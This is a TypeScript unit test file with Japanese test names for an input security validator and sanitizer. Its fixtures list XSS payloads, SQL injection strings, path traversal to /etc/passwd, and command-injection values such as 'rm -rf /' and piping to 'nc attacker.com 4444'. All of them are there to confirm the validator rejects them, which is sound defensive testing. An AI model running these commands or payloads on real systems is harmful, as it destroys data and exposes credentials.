/**
 * Security Validator Unit Tests
 * QA Engineer設計 - セキュリティバリデーターのユニットテスト
 * 
 * @author QA Engineer
 * @security Comprehensive security validation testing
 */

import { SecurityValidator, validate, sanitize, ValidationError } from '../../src/security/validator.js';

describe('SecurityValidator', () => {
  let validator: SecurityValidator;

  beforeEach(() => {
    validator = new SecurityValidator();
  });

  describe('validateString', () => {
    it('必須チェックが正常に動作する', () => {
      const errors = validator.validateString('', 'testField', { required: true });
      expect(errors).toHaveLength(1);
      expect(errors[0].rule).toBe('required');
      expect(errors[0].severity).toBe('high');
    });

    it('最小長チェックが正常に動作する', () => {
      const errors = validator.validateString('ab', 'testField', { minLength: 5 });
      expect(errors).toHaveLength(1);
      expect(errors[0].rule).toBe('minLength');
      expect(errors[0].severity).toBe('medium');
    });

    it('最大長チェックが正常に動作する', () => {
      const longString = 'a'.repeat(101);
      const errors = validator.validateString(longString, 'testField', { maxLength: 100 });
      expect(errors).toHaveLength(1);
      expect(errors[0].rule).toBe('maxLength');
      expect(errors[0].severity).toBe('high');
    });

    it('パターンマッチングが正常に動作する', () => {
      const errors = validator.validateString('invalid123', 'testField', { 
        pattern: /^[a-zA-Z]+$/ 
      });
      expect(errors).toHaveLength(1);
      expect(errors[0].rule).toBe('pattern');
    });

    it('許可文字チェックが正常に動作する', () => {
      const errors = validator.validateString('abc123!', 'testField', { 
        allowedChars: 'a-zA-Z0-9' 
      });
      expect(errors).toHaveLength(1);
      expect(errors[0].rule).toBe('allowedChars');
    });

    it('禁止文字チェックが正常に動作する', () => {
      const errors = validator.validateString('abc<script>', 'testField', { 
        blockedChars: '<>"\'' 
      });
      expect(errors).toHaveLength(1);
      expect(errors[0].rule).toBe('blockedChars');
    });

    it('正常な値に対してエラーを返さない', () => {
      const errors = validator.validateString('validString123', 'testField', {
        required: true,
        minLength: 5,
        maxLength: 20,
        pattern: /^[a-zA-Z0-9]+$/
      });
      expect(errors).toHaveLength(0);
    });
  });

  describe('Security Threat Detection', () => {
    it('XSS攻撃を検出する', () => {
      const maliciousInputs = [
        '<script>alert("xss")</script>',
        'javascript:alert("xss")',
        '<img onerror="alert(1)" src="x">',
        '<iframe src="javascript:alert(1)"></iframe>'
      ];

      maliciousInputs.forEach(input => {
        const errors = validator.validateString(input, 'testField');
        const xssError = errors.find(e => e.rule === 'xss_detection');
        expect(xssError).toBeDefined();
        expect(xssError?.severity).toBe('high');
      });
    });

    it('SQLインジェクション攻撃を検出する', () => {
      const maliciousInputs = [
        'SELECT * FROM users',
        "' OR 1=1 --",
        'UNION SELECT password FROM users',
        'DROP TABLE users'
      ];

      maliciousInputs.forEach(input => {
        const errors = validator.validateString(input, 'testField');
        const sqlError = errors.find(e => e.rule === 'sql_injection_detection');
        expect(sqlError).toBeDefined();
        expect(sqlError?.severity).toBe('high');
      });
    });

    it('コマンドインジェクション攻撃を検出する', () => {
      const maliciousInputs = [
        'test; rm -rf /',
        'test && cat /etc/passwd',
        'test | nc attacker.com 4444',
        'test`whoami`'
      ];

      maliciousInputs.forEach(input => {
        const errors = validator.validateString(input, 'testField');
        const cmdError = errors.find(e => e.rule === 'command_injection_detection');
        expect(cmdError).toBeDefined();
        expect(cmdError?.severity).toBe('high');
      });
    });
  });

  describe('sanitizeString', () => {
    it('HTMLタグを正常に除去する', () => {
      const input = '<div>Hello <script>alert("xss")</script> World</div>';
      const result = validator.sanitizeString(input, { removeHtml: true });
      expect(result).toBe('Hello alert("xss") World');
      expect(result).not.toContain('<');
      expect(result).not.toContain('>');
    });

    it('スクリプトタグを正常に除去する', () => {
      const input = 'Hello <script>alert("xss")</script> javascript:alert("test") onclick="alert(1)"';
      const result = validator.sanitizeString(input, { removeScripts: true });
      expect(result).not.toContain('<script>');
      expect(result).not.toContain('javascript:');
      expect(result).not.toContain('onclick=');
    });

    it('特殊文字を正常に除去する', () => {
      const input = 'Hello <test> "world" \'test\' & more';
      const result = validator.sanitizeString(input, { removeSpecialChars: true });
      expect(result).toBe('Hello test world test  more');
    });

    it('ホワイトスペースを正規化する', () => {
      const input = '  Hello    World  \n\t  Test  ';
      const result = validator.sanitizeString(input, { normalizeWhitespace: true });
      expect(result).toBe('Hello World Test');
    });

    it('長さ制限を適用する', () => {
      const input = 'a'.repeat(100);
      const result = validator.sanitizeString(input, { maxLength: 10 });
      expect(result).toHaveLength(10);
      expect(result).toBe('a'.repeat(10));
    });

    it('空文字や無効な入力を適切に処理する', () => {
      expect(validator.sanitizeString('', {})).toBe('');
      expect(validator.sanitizeString(null as any, {})).toBe('');
      expect(validator.sanitizeString(undefined as any, {})).toBe('');
    });
  });

  describe('validateGitHubRepository', () => {
    it('正しいGitHubリポジトリ形式を受け入れる', () => {
      const validRepos = [
        'owner/repo',
        'test-owner/test-repo',
        'owner123/repo_name.test'
      ];

      validRepos.forEach(repo => {
        const errors = validator.validateGitHubRepository(repo);
        expect(errors).toHaveLength(0);
      });
    });

    it('不正なGitHubリポジトリ形式を拒否する', () => {
      const invalidRepos = [
        'owner',
        'owner/',
        '/repo',
        'owner/repo/extra',
        'owner repo',
        'owner<script>/repo'
      ];

      invalidRepos.forEach(repo => {
        const errors = validator.validateGitHubRepository(repo);
        expect(errors.length).toBeGreaterThan(0);
      });
    });
  });

  describe('validateFilename', () => {
    it('安全なファイル名を受け入れる', () => {
      const validFilenames = [
        'test.txt',
        'my-file_123.json',
        'data.csv'
      ];

      validFilenames.forEach(filename => {
        const errors = validator.validateFilename(filename);
        expect(errors).toHaveLength(0);
      });
    });

    it('危険なファイル名を拒否する', () => {
      const invalidFilenames = [
        '../../../etc/passwd',
        'file<script>.txt',
        'file|pipe.txt',
        'con.txt', // Windows予約語
        'file?.txt'
      ];

      invalidFilenames.forEach(filename => {
        const errors = validator.validateFilename(filename);
        expect(errors.length).toBeGreaterThan(0);
      });
    });
  });

  describe('validateUrl', () => {
    it('安全なHTTPS URLを受け入れる', () => {
      const validUrls = [
        'https://github.com/owner/repo',
        'https://api.github.com/repos/owner/repo',
        'https://example.com/path?param=value'
      ];

      validUrls.forEach(url => {
        const errors = validator.validateUrl(url);
        expect(errors).toHaveLength(0);
      });
    });

    it('HTTP URLを拒否する', () => {
      const errors = validator.validateUrl('http://github.com/owner/repo');
      const httpsError = errors.find(e => e.rule === 'https_required');
      expect(httpsError).toBeDefined();
      expect(httpsError?.severity).toBe('high');
    });

    it('不正なURL形式を拒否する', () => {
      const invalidUrls = [
        'javascript:alert(1)',
        'data:text/html,<script>alert(1)</script>',
        'file:///etc/passwd',
        'ftp://example.com'
      ];

      invalidUrls.forEach(url => {
        const errors = validator.validateUrl(url);
        expect(errors.length).toBeGreaterThan(0);
      });
    });
  });

  describe('validateNumber', () => {
    it('有効な数値を受け入れる', () => {
      const errors = validator.validateNumber(42, 'testNumber', 0, 100);
      expect(errors).toHaveLength(0);
    });

    it('文字列数値を正しく処理する', () => {
      const errors = validator.validateNumber('42.5', 'testNumber', 0, 100);
      expect(errors).toHaveLength(0);
    });

    it('無効な数値を拒否する', () => {
      const errors = validator.validateNumber('not-a-number', 'testNumber');
      expect(errors).toHaveLength(1);
      expect(errors[0].rule).toBe('invalid_number');
    });

    it('範囲外の値を拒否する', () => {
      const minErrors = validator.validateNumber(-5, 'testNumber', 0, 100);
      expect(minErrors).toHaveLength(1);
      expect(minErrors[0].rule).toBe('min_value');

      const maxErrors = validator.validateNumber(150, 'testNumber', 0, 100);
      expect(maxErrors).toHaveLength(1);
      expect(maxErrors[0].rule).toBe('max_value');
    });
  });

  describe('validateBatch', () => {
    it('複数フィールドの一括検証が動作する', () => {
      const data = {
        name: 'test',
        email: 'invalid-email',
        age: '25'
      };

      const rules = {
        name: { required: true, minLength: 2 },
        email: { required: true, pattern: /^[^\s@]+@[^\s@]+\.[^\s@]+$/ },
        age: { required: true }
      };

      const errors = validator.validateBatch(data, rules);
      expect(errors.length).toBeGreaterThan(0);
      
      const emailError = errors.find(e => e.field === 'email');
      expect(emailError).toBeDefined();
    });
  });

  describe('analyzeValidationErrors', () => {
    it('検証エラーの分析が正常に動作する', () => {
      const errors: ValidationError[] = [
        {
          field: 'name',
          rule: 'required',
          message: 'Name is required',
          value: '',
          severity: 'high'
        },
        {
          field: 'email',
          rule: 'xss_detection',
          message: 'XSS detected',
          value: '<script>',
          severity: 'high'
        },
        {
          field: 'name',
          rule: 'minLength',
          message: 'Too short',
          value: 'a',
          severity: 'medium'
        }
      ];

      const analysis = validator.analyzeValidationErrors(errors);
      
      expect(analysis.totalErrors).toBe(3);
      expect(analysis.criticalErrors).toBe(2);
      expect(analysis.errorsByField.name).toBe(2);
      expect(analysis.errorsByField.email).toBe(1);
      expect(analysis.securityThreats).toHaveLength(1);
      expect(analysis.recommendations.length).toBeGreaterThan(0);
    });
  });

  describe('generateSecurityHash', () => {
    it('一貫したハッシュを生成する', () => {
      const data = 'test data';
      const hash1 = validator.generateSecurityHash(data);
      const hash2 = validator.generateSecurityHash(data);
      
      expect(hash1).toBe(hash2);
      expect(hash1).toHaveLength(64); // SHA256の長さ
      expect(hash1).toMatch(/^[a-f0-9]{64}$/);
    });

    it('異なるデータに対して異なるハッシュを生成する', () => {
      const hash1 = validator.generateSecurityHash('data1');
      const hash2 = validator.generateSecurityHash('data2');
      
      expect(hash1).not.toBe(hash2);
    });
  });

  describe('normalizeInput', () => {
    it('入力データを正規化する', () => {
      const input = '  \t\n  Hello   World  \x00\x1F  ';
      const normalized = validator.normalizeInput(input);
      
      expect(normalized).toBe('Hello World');
      expect(normalized).not.toContain('\x00');
      expect(normalized).not.toContain('\x1F');
    });

    it('長い入力を制限する', () => {
      const longInput = 'a'.repeat(20000);
      const normalized = validator.normalizeInput(longInput);
      
      expect(normalized).toHaveLength(10000);
    });
  });
});

describe('Validation Shortcuts', () => {
  describe('validate', () => {
    it('GitHubリポジトリ検証のショートカットが動作する', () => {
      const errors = validate.githubRepo('invalid repo name');
      expect(errors.length).toBeGreaterThan(0);
    });

    it('ファイル名検証のショートカットが動作する', () => {
      const errors = validate.filename('valid-file.txt');
      expect(errors).toHaveLength(0);
    });

    it('URL検証のショートカットが動作する', () => {
      const errors = validate.url('https://github.com');
      expect(errors).toHaveLength(0);
    });

    it('文字列検証のショートカットが動作する', () => {
      const errors = validate.string('test', 'field', { required: true });
      expect(errors).toHaveLength(0);
    });

    it('数値検証のショートカットが動作する', () => {
      const errors = validate.number(50, 'age', 0, 100);
      expect(errors).toHaveLength(0);
    });
  });

  describe('sanitize', () => {
    it('文字列サニタイズのショートカットが動作する', () => {
      const result = sanitize.string('<test>hello</test>', { removeHtml: true });
      expect(result).toBe('hello');
    });

    it('HTMLサニタイズのショートカットが動作する', () => {
      const result = sanitize.html('<script>alert("xss")</script>Hello World');
      expect(result).toBe('Hello World');
      expect(result).not.toContain('<script>');
    });

    it('正規化のショートカットが動作する', () => {
      const result = sanitize.normalize('  Hello   World  ');
      expect(result).toBe('Hello World');
    });
  });
});

describe('Edge Cases and Error Handling', () => {
  let validator: SecurityValidator;

  beforeEach(() => {
    validator = new SecurityValidator();
  });

  it('null値を適切に処理する', () => {
    const errors = validator.validateString(null as any, 'testField', { required: true });
    expect(errors).toHaveLength(1);
    expect(errors[0].rule).toBe('required');
  });

  it('undefined値を適切に処理する', () => {
    const errors = validator.validateString(undefined as any, 'testField', { required: false });
    expect(errors).toHaveLength(0);
  });

  it('空のバリデーションルールを処理する', () => {
    const errors = validator.validateString('test', 'testField', {});
    expect(errors).toHaveLength(0);
  });

  it('カスタムバリデーターが正常に動作する', () => {
    const customValidator = (value: string) => value.includes('valid');
    const errors = validator.validateString('invalid', 'testField', { 
      customValidator 
    });
    expect(errors).toHaveLength(1);
    expect(errors[0].rule).toBe('custom');
  });

  it('複数のセキュリティ脅威を同時に検出する', () => {
    const maliciousInput = '<script>SELECT * FROM users</script>; rm -rf /';
    const errors = validator.validateString(maliciousInput, 'testField');
    
    const threatTypes = errors.map(e => e.rule);
    expect(threatTypes).toContain('xss_detection');
    expect(threatTypes).toContain('sql_injection_detection');
    expect(threatTypes).toContain('command_injection_detection');
  });
});